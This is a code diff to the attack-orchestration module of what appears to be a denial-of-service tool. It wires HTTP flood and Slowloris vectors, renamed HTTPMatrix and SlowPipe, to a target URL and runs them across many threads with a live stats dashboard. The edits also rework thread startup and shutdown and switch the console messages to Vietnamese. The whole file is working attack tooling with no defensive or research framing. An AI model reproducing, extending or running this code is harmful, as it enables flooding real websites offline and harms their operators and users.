@@ -1,12 +1,10 @@
+# -*- coding: utf-8 -*-
 import time
-from rich.console import Console
 
 import config
-from utils.display import launch_dashboard
-from core.vectors.http_flood import HTTPFlood
-from core.vectors.slow_loris import SlowLoris
-
-console = Console()
+from utils.display import launch_dashboard, console
+from core.vectors.http_flood import HTTPMatrix
+from core.vectors.slow_loris import SlowPipe
 
 class AttackManager:
     def __init__(self, target_url, vector_choice, mode, threads):
@@ -18,14 +16,14 @@ class AttackManager:
 
     def select_vector(self):
         if self.vector_choice == "1":
-            return HTTPFlood
+            return HTTPMatrix
         elif self.vector_choice == "2":
-            return SlowLoris
-        else:
-            console.print(f"[bold red]Invalid vector choice '{self.vector_choice}'. Defaulting to HTTP Flood.[/bold red]")
-            return HTTPFlood
+            return SlowPipe
+        console.print(f"[bold red]Lựa chọn vector không hợp lệ. Mặc định dùng HTTP Matrix.[/bold red]")
+        return HTTPMatrix
 
     def start_attack(self):
+        console.print("[bold purple]Đang triển khai các vector tấn công...[/bold purple]")
         VectorClass = self.select_vector()
 
         for _ in range(self.threads):
@@ -34,20 +32,20 @@ class AttackManager:
 
         config.attack_stats['start_time'] = time.time()
         
-        for thread in self.all_threads:
-            thread.start()
-
         dashboard_thread = launch_dashboard()
 
+        for thread in self.all_threads:
+            thread.start()
+            time.sleep(0.001)
+
         try:
-            while not config.stop_event.is_set() and any(t.is_alive() for t in self.all_threads):
-                time.sleep(1)
+            for t in self.all_threads:
+                t.join()
         except KeyboardInterrupt:
             config.stop_event.set()
         finally:
-            if dashboard_thread.is_alive():
+            config.stop_event.set()
+            if dashboard_thread and dashboard_thread.is_alive():
                 dashboard_thread.join()
-            for t in self.all_threads:
-                if t.is_alive():
-                    t.join(timeout=1)
+            console.print("\n[bold yellow]Đang thu hồi tất cả các luồng...[/bold yellow]")
 
